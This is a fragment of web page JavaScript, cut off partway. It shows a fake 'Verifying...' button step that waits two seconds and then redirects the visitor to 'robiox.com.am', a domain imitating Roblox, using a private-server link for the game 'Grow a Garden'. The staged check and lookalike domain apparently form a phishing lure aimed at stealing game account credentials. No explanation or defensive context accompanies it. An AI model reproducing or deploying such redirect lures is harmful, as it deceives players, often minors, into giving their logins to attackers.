  <script>
    function startVerification() {
      // Optional: Show some feedback
      const btn = document.querySelector('button');
      btn.innerText = "Verifying...";
      btn.disabled = true;

      // Wait 2 seconds then redirect
      setTimeout(() => {
        window.location.href = "https://www.robiox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=61515062732729396247484577283096";
